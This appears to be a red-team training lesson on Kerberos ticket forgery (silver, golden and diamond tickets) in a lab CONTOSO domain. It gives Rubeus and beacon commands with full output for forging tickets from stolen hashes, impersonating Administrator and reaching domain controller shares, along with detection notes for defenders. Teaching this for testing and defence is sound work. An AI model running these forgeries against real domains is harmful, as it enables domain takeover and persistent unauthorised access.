
Ticket forgery is a technique [[T1558](https://attack.mitre.org/techniques/T1558/)] where an adversary uses stolen secrets to create their own Kerberos tickets offline and inject them into a logon session for use, rather than requesting them legitimately from a KDC.

## Silver Tickets

A 'silver ticket' is a Kerberos service ticket that has been forged using a service's secret [T1558.002](https://attack.mitre.org/techniques/T1558/002/) and are used to target a specific service on a specific machine.

A common use-case for this is to maintain local admin access to machines after they've already been compromised.  For example, an adversary could acquire initial local admin access through an exploit but dumping the computer's secret (password hash) will allow them to forge tickets for services running under the context of that computer account that are useful for remote access (such as CIFS).  The adversary can now maintain remote access to this computer without relying on the original means by which they gained access.  The downside of this technique is that computer account secrets are automatically changed by Active Directory every 30 days by default.

Because these tickets are typically crafted offline, we can run a tool such as Rubeus or Mimikatz on our local computer.  In this example, we're using the AES256 hash of the lon-db-1 computer account to forge a ticket for CIFS, whilst impersonating the default domain administrator.

```powershell
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:cifs/lon-db-1 /aes256:bc6fd6e8519b52e09f60961beeee083a441c25908e30a6c29b124b516e06945f /user:Administrator /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /nowrap

[*] Action: Build TGS

[*] Building PAC

[*] Domain         : CONTOSO.COM (CONTOSO)
[*] SID            : S-1-5-21-3926355307-1661546229-813047887
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ServiceKey     : BC6FD6E8519B52E09F60961BEEEE083A441C25908E30A6C29B124B516E06945F
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] KDCKey         : BC6FD6E8519B52E09F60961BEEEE083A441C25908E30A6C29B124B516E06945F
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] Service        : cifs
[*] Target         : lon-db-1

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGS for 'Administrator' to 'cifs/lon-db-1'

[*] AuthTime       : 04/03/2025 12:32:31
[*] StartTime      : 04/03/2025 12:32:31
[*] EndTime        : 04/03/2025 22:32:31
[*] RenewTill      : 11/03/2025 12:32:31

[*] base64(ticket.kirbi):

      doIFb[...snip...]kYi0x
```

Where:

- `/service` is the target service.
    
- `/aes256` is the AES256 hash of the target computer account.
    
- `/user` is the username to impersonate.
    
- `/domain` is the FQDN of the computer's domain.
    
- `/sid` is the domain SID.

> You will notice that Rubeus uses a user RID of 500 and group RIDs of 520,512,513,519,518 by default.  You can change these with the `/id` and `/groups` parameters.

```powershell
beacon> make_token CONTOSO\Administrator FakePass
[+] Impersonated CONTOSO\Administrator (netonly)

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:doIFb[...snip...]kYi0x

[*] Action: Import Ticket
[+] Ticket successfully imported!

beacon> run klist

Current LogonId is 0:0x1782fca

Cached Tickets: (1)

#0>	Client: Administrator @ CONTOSO.COM
	Server: cifs/lon-db-1 @ CONTOSO.COM
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x40a00000 -> forwardable renewable pre_authent 
	Start Time: 3/4/2025 12:32:31 (local)
	End Time:   3/4/2025 22:32:31 (local)
	Renew Time: 3/11/2025 12:32:31 (local)
	Session Key Type: AES-256-CTS-HMAC-SHA1-96
	Cache Flags: 0 
	Kdc Called: 

beacon> ls \\lon-db-1\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     01/23/2025 15:44:52   $Recycle.Bin
          dir     01/23/2025 13:57:51   $WinREAgent
          dir     03/03/2025 14:16:43   Config.Msi
          dir     01/23/2025 13:47:37   Documents and Settings
          dir     05/08/2021 09:20:24   PerfLogs
          dir     03/03/2025 14:15:14   Program Files
          dir     03/03/2025 14:15:27   Program Files (x86)
          dir     03/03/2025 14:01:21   ProgramData
          dir     01/23/2025 13:47:43   Recovery
          dir     03/03/2025 13:38:45   System Volume Information
          dir     03/04/2025 09:57:42   Users
          dir     03/03/2025 13:37:44   Windows
 12kb     fil     03/04/2025 10:01:30   DumpStack.log.tmp
 1gb      fil     03/04/2025 10:01:30   pagefile.sys
 
beacon> rev2self
[*] Tasked beacon to revert token
```

Another use-case for silver tickets is when combined with other attacks that allow you to access service secrets, such as [Kerberoasting](https://www.zeropointsecurity.co.uk/path-player?courseid=red-team-ops&unit=67851a86ba9789af1107f5f9).  Consider a scenario where you obtain the plaintext password of a domain account running an MSSQL service.  That service account may not have sysadmin privileges on the database instance (which is default), so the service account is not directly useful in gaining access to the underlying database.  However, you can use the service's secret to forge a service ticket for the MSSQL service, impersonating a user you know to be a sysadmin.

First, convert the known plaintext credential into its hash equivalents.

```powershell
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /user:MSSQLSvc /domain:dublin.contoso.com /password:Passw0rd!

[*] Action: Calculate Password Hash(es)

[*] Input password             : Passw0rd!
[*] Input username             : mssql_svc
[*] Input domain               : CONTOSO.COM
[*] Salt                       : CONTOSO.COMmssql_svc
[*]       rc4_hmac             : FC525C9683E8FE067095BA2DDC971889
[*]       aes128_cts_hmac_sha1 : 53B5F3804FBF13E7DD624E71D18DF9BB
[*]       aes256_cts_hmac_sha1 : E4A51DAD46B6D1BA85627EEC82991C8FC94C279CE06140751E02BA015E6A21F9
[*]       des_cbc_md5          : DF91ECCDAE70BA0E
```

Then forge the service ticket for _MSSQLSvc/lon-db-1.contoso.com_.

```powershell
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:MSSQLSvc/lon-db-1.contoso.com:1433 /rc4:FC525C9683E8FE067095BA2DDC971889 /user:rsteel /id:1108 /groups:513,1106,1107,4602 /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /nowrap

[*] Action: Build TGS

[*] Building PAC

[*] Domain         : CONTOSO.COM (CONTOSO)
[*] SID            : S-1-5-21-3926355307-1661546229-813047887
[*] UserId         : 1108
[*] Groups         : 513,1106,1107,4602
[*] ServiceKey     : FC525C9683E8FE067095BA2DDC971889
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : FC525C9683E8FE067095BA2DDC971889
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : MSSQLSvc
[*] Target         : lon-db-1.contoso.com:1433

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGS for 'rsteel' to 'MSSQLSvc/lon-db-1.contoso.com:1433'

[*] AuthTime       : 04/03/2025 12:39:29
[*] StartTime      : 04/03/2025 12:39:29
[*] EndTime        : 04/03/2025 22:39:29
[*] RenewTill      : 11/03/2025 12:39:29

[*] base64(ticket.kirbi):

      doIFV[...snip...]xNDMz
```

Where:

- `/id` is the RID for rsteel.
    
- `/groups` are the RIDs of rsteel's group membership.  513 is 'Domain Users', 1106 is 'Workstation Admins', 1107 is 'Server Admins', and 4602 is 'Database Admins'.

```powershell
beacon> make_token CONTOSO\rsteel FakePass
[+] Impersonated CONTOSO\rsteel (netonly)

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:doIFVzCCBVOgAwIBBaEDAgEWooIETjCCBEphggRG<SNIP>
[*] Action: Import Ticket
[+] Ticket successfully imported!

beacon> run klist

Current LogonId is 0:0x179c863

Cached Tickets: (1)

#0>	Client: rsteel @ CONTOSO.COM
	Server: MSSQLSvc/lon-db-1.contoso.com:1433 @ CONTOSO.COM
	KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
	Ticket Flags 0x40a00000 -> forwardable renewable pre_authent 
	Start Time: 3/4/2025 12:39:29 (local)
	End Time:   3/4/2025 22:39:29 (local)
	Renew Time: 3/11/2025 12:39:29 (local)
	Session Key Type: RSADSI RC4-HMAC(NT)
	Cache Flags: 0 
	Kdc Called:
    
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:lon-db-1.contoso.com /m:info

[*] Executing the 'info' module on lon-db-1.contoso.com


| Object                | Value                                 |
| --------------------- | ------------------------------------- |
| ComputerName          | lon-db-1                              |
| DomainName            | CONTOSO                               |
| ServicePid            | 460                                   |
| OsMachineType         | ServerNT                              |
| OsVersion             | Windows Server 2022 Standard          |
| SqlServerServiceName  | MSSQLSERVER                           |
| SqlServiceAccountName | CONTOSO\mssql_svc                     |
| AuthenticationMode    | Windows and SQL Server Authentication |
| ForcedEncryption      | 0                                     |
| Clustered             | No                                    |
| SqlVersionNumber      | 16.0.1000.6                           |
| SqlMajorVersionNumber | 2022                                  |
| SqlServerEdition      | Standard Edition (64-bit)             |
| SqlServerServicePack  | RTM                                   |
| OsArchitecture        | X64                                   |
| OsVersionNumber       | 2022                                  |
| CurrentLogon          | CONTOSO\rsteel                        |
| ActiveSessions        | 1                                     |
```

# _OPSEC Considerations_

Silver tickets can be effectively mitigated when PAC validation is enabled on computers.  In the examples above, Rubeus will use the computer's secret to sign the ticket where it should be signed with the krbtgt's secret.  Obviously, this isn't possible if you don't possess it.  So when the target computer receives the silver ticket, it will validate the checksum signature with the KDC which will fail, and the service will deny you access.

In cases where PAC validation cannot be enabled or the adversary has signed the ticket using the krbtgt hash, silver tickets may still be possible to detect.  Although, unfortunately, there is no silver bullet (no pun intended).  In a legitimate ticket exchange, you would expect to have a TGS-REQ and TGS-REP to obtain a service ticket before it can be used.  A TGS-REQ is logged by a domain controller as event ID 4769, which includes information such as the requesting user and the target service.  When a service ticket is used, the target computer also produces a [4624](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4624) event for the user detailed in the ticket.  Since silver tickets are forged offline, their use produces a 4624 event on the target computer, but there would be no corresponding 4769 event prior to that.

> Silver tickets may also be detected if they're forged with inaccurate or anomalous information.  For example, the Kerberos realm (i.e. the domain name) should traditionally be in all uppercase characters.  If a ticket is logged that has the domain in lowercase, then it could be an indication that it's forged.  Some tools, such as Rubeus, make an effort to convert provided the domain to uppercase to avoid this particular anomaly but your mileage will vary between tools.


### Golden Tickets

A 'golden ticket' is a forged TGT that has been signed with the KDC's secret [T1558.001](https://attack.mitre.org/techniques/T1558/001/).  This hash is typically obtained via [DCSync](https://www.zeropointsecurity.co.uk/path-player?courseid=red-team-ops&unit=674b7a8f599d7c0c400975d8) after domain admin privileges have been obtained.  With it, an adversary can forge valid TGTs for any user in the domain and by extension, request service tickets as any user, to any service.

```powershell
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c /user:Administrator /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /nowrap

[*] Action: Build TGT

[*] Building PAC

[*] Domain         : CONTOSO.COM (CONTOSO)
[*] SID            : S-1-5-21-3926355307-1661546229-813047887
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ServiceKey     : 512920012661247C674784EEF6E1B3BA52F64F28F57CF2B3F67246F20E6C722C
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] KDCKey         : 512920012661247C674784EEF6E1B3BA52F64F28F57CF2B3F67246F20E6C722C
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] Service        : krbtgt
[*] Target         : CONTOSO.COM

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator@CONTOSO.COM'

[*] AuthTime       : 04/03/2025 15:49:53
[*] StartTime      : 04/03/2025 15:49:53
[*] EndTime        : 05/03/2025 01:49:53
[*] RenewTill      : 11/03/2025 15:49:53

[*] base64(ticket.kirbi):

      doIFg[...snip...]uQ09N
```

Where:

- `/aes256` is the AES256 hash for the krbtgt account.
    
- `/user` is the username to impersonate.
    
- `/domain` is the current domain.
    
- `/sid` is the current domain's SID.

When a golden ticket is injected and a service accessed, Windows will use the injected TGT to obtain the necessary service tickets using the typical TGS-REQ/TGS-REP process.

```powershell
beacon> make_token CONTOSO\Administrator FakePass
[+] Impersonated CONTOSO\Administrator (netonly)

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:doIFg[...snip...]uQ09N

[*] Action: Import Ticket
[+] Ticket successfully imported!

beacon> run klist

Current LogonId is 0:0x1b4e2f1

Cached Tickets: (1)

#0>	Client: Administrator @ CONTOSO.COM
	Server: krbtgt/CONTOSO.COM @ CONTOSO.COM
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent 
	Start Time: 3/4/2025 15:49:53 (local)
	End Time:   3/5/2025 1:49:53 (local)
	Renew Time: 3/11/2025 15:49:53 (local)
	Session Key Type: AES-256-CTS-HMAC-SHA1-96
	Cache Flags: 0x1 -> PRIMARY 
	Kdc Called: 

beacon> ls \\lon-dc-1\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     01/24/2025 13:33:39   $Recycle.Bin
          dir     01/23/2025 13:57:51   $WinREAgent
          dir     01/23/2025 13:47:37   Documents and Settings
          dir     05/08/2021 09:20:24   PerfLogs
          dir     03/04/2025 13:17:37   Program Files
          dir     01/23/2025 15:46:18   Program Files (x86)
          dir     03/04/2025 13:17:19   ProgramData
          dir     01/23/2025 13:47:43   Recovery
          dir     01/29/2025 10:42:20   System Volume Information
          dir     01/24/2025 13:33:21   Users
          dir     01/24/2025 13:49:56   Windows
 12kb     fil     03/04/2025 10:35:36   DumpStack.log.tmp
 1gb      fil     03/04/2025 10:35:36   pagefile.sys
 
beacon> run klist

Current LogonId is 0:0x1b4e2f1

Cached Tickets: (2)

#0>	Client: Administrator @ CONTOSO.COM
	Server: krbtgt/CONTOSO.COM @ CONTOSO.COM
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent 
	Start Time: 3/4/2025 15:49:53 (local)
	End Time:   3/5/2025 1:49:53 (local)
	Renew Time: 3/11/2025 15:49:53 (local)
	Session Key Type: AES-256-CTS-HMAC-SHA1-96
	Cache Flags: 0x1 -> PRIMARY 
	Kdc Called: 

#1>	Client: Administrator @ CONTOSO.COM
	Server: cifs/lon-dc-1 @ CONTOSO.COM
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize 
	Start Time: 3/4/2025 15:54:02 (local)
	End Time:   3/5/2025 1:49:53 (local)
	Renew Time: 3/11/2025 15:49:53 (local)
	Session Key Type: AES-256-CTS-HMAC-SHA1-96
	Cache Flags: 0 
	Kdc Called: lon-dc-1.contoso.com
```

# _OPSEC Considerations_

Similar strategies as above can be used to detect the use of golden tickets.  In a normal ticket exchange, service tickets must be obtained via a TGS-REQ using a valid TGT.  This TGT is also usually requested by the user (transparently) in an AS-REQ and returned by the KDC in an AS-REP.  These AS-REQs are logged by domain controllers as event ID [4768](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768).  If defenders spot TGS-REQs (or 4769 events) without any prior 4768 event for the user, this may be an indicator that the TGT was forged offline.

Anomalous ticket data can also give golden tickets away.  One egregious example is the lifetime data that Mimikatz includes by default.  Most Kerberos domain policies have the maximum lifetime of a ticket set to 10 hours and the maximum lifetime for ticket renewal to 7 days.  That effectively means you can renew a ticket every 10 hours up to a maximum age of 7 days.  However, Mimikatz sets the lifetime of its forged tickets to 10 _years_.

### Diamond Tickets

Functionally, a diamond ticket is no different to a forged TGT - the difference is in how it's created.  Because silver and golden tickets are forged offline, it's up to the adversary to decide what information to put in them.   This is good for flexibility but introduces the scope for using incorrect or anomalous information (as previously described).

A diamond ticket is created by requesting a legitimate TGT for a user.  The KDC's secret is then used to decrypt the ticket where the internal information, such as the principal's name, ID, groups, etc, can be changed.   The ticket is then re-encrypted and re-signed with the KDC's secret.

The advantage of this technique is that all the peripheral information in the ticket is perfectly in-line with the domain's policy.  Another is that it makes it more difficult to detected based on missing AS-REQs.

```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /krbkey:512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c /ticketuser:Administrator /ticketuserid:500 /domain:CONTOSO.COM /nowrap

[*] Action: Diamond Ticket

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/lon-dc-1.contoso.com'
[+] Kerberos GSS-API initialization success!
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: FIpY29FEAdwzu+CZG4M87n/uyXRCg6UoKecr1m3fZRE=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIFj[...snip...]kNPTQ==

[*] Decrypting TGT
[*] Retreiving PAC
[*] Modifying PAC
[*] Signing PAC
[*] Encrypting Modified TGT

[*] base64(ticket.kirbi):

      doIF5[...snip...]5DT00=
```

Where:

- `/tgtdeleg` uses the TGT [delegation trick](https://github.com/GhostPack/Rubeus?tab=readme-ov-file#tgtdeleg) to obtain a usable TGT for the current user without needing credentials.
    
- `/krbkey` is the krbtgt's AES256 hash.
    
- `/ticketuser` is the user we want to impersonate.
    
- `/ticketuserid` is the impersonated user's RID.
    
- `/domain` is the current domain.

Rubeus `describe` has a `/servicekey` parameter which will decrypt and display the ticket's PAC.  If we describe the first ticket, we see that it's a TGT for the current user (as expected).

```powershell
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /servicekey:512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c /ticket:doIFm[...snip...]kNPTQ==

[*] Action: Describe Ticket

  ServiceName              :  krbtgt/CONTOSO.COM
  ServiceRealm             :  CONTOSO.COM
  UserName                 :  pchilds (NT_PRINCIPAL)
  UserRealm                :  CONTOSO.COM
  StartTime                :  05/03/2025 09:36:08
  EndTime                  :  05/03/2025 19:35:40
  RenewTill                :  12/03/2025 09:35:40
  Flags                    :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  +3ZP/m5FaNuXrJH6yMFwhFLiTUwBygBhzlQ9qqxB3m8=
  Block One Plain Text     :  6382042730820423
  Decrypted PAC            :
    LogonInfo              :
      LogonTime            : 05/03/2025 09:35:29
      LogoffTime           :
      KickOffTime          :
      PasswordLastSet      : 24/01/2025 14:10:06
      PasswordCanChange    : 25/01/2025 14:10:06
      PasswordMustChange   :
      EffectiveName        : pchilds
      FullName             : Polly Childs
      LogonScript          :
      ProfilePath          :
      HomeDirectory        :
      HomeDirectoryDrive   :
      LogonCount           : 18
      BadPasswordCount     : 0
      UserId               : 1105
      PrimaryGroupId       : 513
      GroupCount           : 2
      Groups               : 1106,513
      UserFlags            : (32) EXTRA_SIDS
      UserSessionKey       : 0000000000000000
      LogonServer          : LON-DC-1
      LogonDomainName      : CONTOSO
      LogonDomainId        : S-1-5-21-3926355307-1661546229-813047887
      UserAccountControl   : (528) NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
      ExtraSIDCount        : 1
      ExtraSIDs            : S-1-18-1
      ResourceGroupCount   : 0
    ServerChecksum         :
      Signature Type       : KERB_CHECKSUM_HMAC_SHA1_96_AES256
      Signature            : D0EBE109C94EDD5E4BA224F2 (VALID)
    KDCChecksum            :
      Signature Type       : KERB_CHECKSUM_HMAC_SHA1_96_AES256
      Signature            : 019CC7B970EF69B29E92C7FF (VALID)
    ClientName             :
      Client Id            : 05/03/2025 09:35:40
      Client Name          : pchilds
    UpnDns                 :
      DNS Domain Name      : CONTOSO.COM
      UPN                  : pchilds@contoso.com
      Flags                : (2) EXTENDED
      SamName              : pchilds
      Sid                  : S-1-5-21-3926355307-1661546229-813047887-1105
    Attributes             :
      AttributeLength      : 2
      AttributeFlags       : (1) PAC_WAS_REQUESTED
    Requestor              :
      RequestorSID         : S-1-5-21-3926355307-1661546229-813047887-1105
```

The ticket is then decrypted, modified, and re-encrypted.  Describing the second ticket shows that it's now a TGT for Administrator.

> Rubeus sets the Groups field to 520,512,513,519,518 by default, but you can change this with the `/groups` parameter.

```powershell
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /servicekey:512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c /ticket:doIF7[...snip...]kNPTQ==

[*] Action: Describe Ticket

  ServiceName              :  krbtgt/CONTOSO.COM
  ServiceRealm             :  CONTOSO.COM
  UserName                 :  Administrator (NT_PRINCIPAL)
  UserRealm                :  CONTOSO.COM
  StartTime                :  05/03/2025 09:36:08
  EndTime                  :  05/03/2025 19:35:40
  RenewTill                :  12/03/2025 09:35:40
  Flags                    :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  +3ZP/m5FaNuXrJH6yMFwhFLiTUwBygBhzlQ9qqxB3m8=
  Block One Plain Text     :  6382047530820471
  Decrypted PAC            :
    LogonInfo              :
      LogonTime            : 05/03/2025 09:35:29
      LogoffTime           :
      KickOffTime          :
      PasswordLastSet      : 24/01/2025 14:10:06
      PasswordCanChange    : 25/01/2025 14:10:06
      PasswordMustChange   :
      EffectiveName        : Administrator
      FullName             : Polly Childs
      LogonScript          :
      ProfilePath          :
      HomeDirectory        :
      HomeDirectoryDrive   :
      LogonCount           : 18
      BadPasswordCount     : 0
      UserId               : 500
      PrimaryGroupId       : 513
      GroupCount           : 5
      Groups               : 520,512,513,519,518
      UserFlags            : (32) EXTRA_SIDS
      UserSessionKey       : 0000000000000000
      LogonServer          : LON-DC-1
      LogonDomainName      : CONTOSO
      LogonDomainId        : S-1-5-21-3926355307-1661546229-813047887
      UserAccountControl   : (528) NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
      ExtraSIDCount        : 1
      ExtraSIDs            : S-1-18-1
      ResourceGroupCount   : 0
    ClientName             :
      Client Id            : 05/03/2025 09:35:40
      Client Name          : Administrator
    UpnDns                 :
      DNS Domain Name      : CONTOSO.COM
      UPN                  : Administrator@contoso.com
      Flags                : (2) EXTENDED
      SamName              : Administrator
      Sid                  : S-1-5-21-3926355307-1661546229-813047887-500
    Attributes             :
      AttributeLength      : 2
      AttributeFlags       : (1) PAC_WAS_REQUESTED
    Requestor              :
      RequestorSID         : S-1-5-21-3926355307-1661546229-813047887-500
    ServerChecksum         :
      Signature Type       : KERB_CHECKSUM_HMAC_SHA1_96_AES256
      Signature            : 91FA516DDD54E76EF88EDC06 (VALID)
    KDCChecksum            :
      Signature Type       : KERB_CHECKSUM_HMAC_SHA1_96_AES256
      Signature            : CFA8C9B8AF6A49175AFE0E1A (VALID)
```

> You'll notice that some fields, such as the FullName, is still that of the original TGT, which may be a potential point of detection.

```powershell
beacon> make_token CONTOSO\Administrator FakePass
[+] Impersonated CONTOSO\Administrator (netonly)

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:doIF5[...snip...]5DT00=

[*] Action: Import Ticket
[+] Ticket successfully imported!

beacon> run klist

Current LogonId is 0:0x1d14ae6

Cached Tickets: (1)

#0>	Client: Administrator @ CONTOSO.COM
	Server: krbtgt/CONTOSO.COM @ CONTOSO.COM
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize 
	Start Time: 3/4/2025 12:30:31 (local)
	End Time:   3/4/2025 19:56:26 (local)
	Renew Time: 3/11/2025 9:56:26 (local)
	Session Key Type: AES-256-CTS-HMAC-SHA1-96
	Cache Flags: 0x1 -> PRIMARY 
	Kdc Called: 

beacon> ls \\lon-dc-1\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     01/24/2025 13:33:39   $Recycle.Bin
          dir     01/23/2025 13:57:51   $WinREAgent
          dir     01/23/2025 13:47:37   Documents and Settings
          dir     05/08/2021 09:20:24   PerfLogs
          dir     01/23/2025 15:46:17   Program Files
          dir     01/23/2025 15:46:18   Program Files (x86)
          dir     03/03/2025 13:38:06   ProgramData
          dir     01/23/2025 13:47:43   Recovery
          dir     01/29/2025 10:42:20   System Volume Information
          dir     01/24/2025 13:33:21   Users
          dir     01/24/2025 13:49:56   Windows
 12kb     fil     03/05/2025 01:31:46   DumpStack.log.tmp
 1gb      fil     03/05/2025 01:31:46   pagefile.sys
```